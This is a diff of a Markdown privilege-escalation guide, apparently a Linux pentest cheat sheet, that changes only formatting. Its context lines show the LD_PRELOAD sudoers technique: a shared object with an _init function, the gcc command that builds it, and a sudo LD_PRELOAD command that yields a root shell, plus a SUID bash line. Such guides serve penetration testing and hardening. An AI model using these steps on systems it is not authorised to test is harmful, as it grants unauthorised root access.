@@ -226,13 +226,14 @@ chmod +s bash 	# set suid permission
 LD_PRELOAD
 ----
 
-If LD_PRELOAD is explicitly defined on sudoers file, it could be used to elevate our privilege. 
+If __LD_PRELOAD__ is explicitly defined on sudoers file, it could be used to elevate our privilege. \
+
 For example: 
 ```
 Defaults        env_keep += LD_PRELOAD
 ```
 
-Create a share object
+Create a share object:
 ```
 #include <stdio.h>
 #include <sys/types.h>
@@ -245,17 +246,17 @@ void _init() {
 }
 ```
 
-Compile it
+Compile it:
 ```
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 ```
 
-If you have a binary that you could launch with sudo and NOPASSWD, launch it with LD_PRELOAD pointing to your shared object.
+If you have a binary that you could launch with sudo and NOPASSWD, launch it with LD_PRELOAD pointing to your shared object:
 ```
 sudo LD_PRELOAD=/tmp/shell.so find
 ```
 
-More information can be found [here](http://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)
+More information can be found [here](http://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/).
 
 Sudoers file
 ----
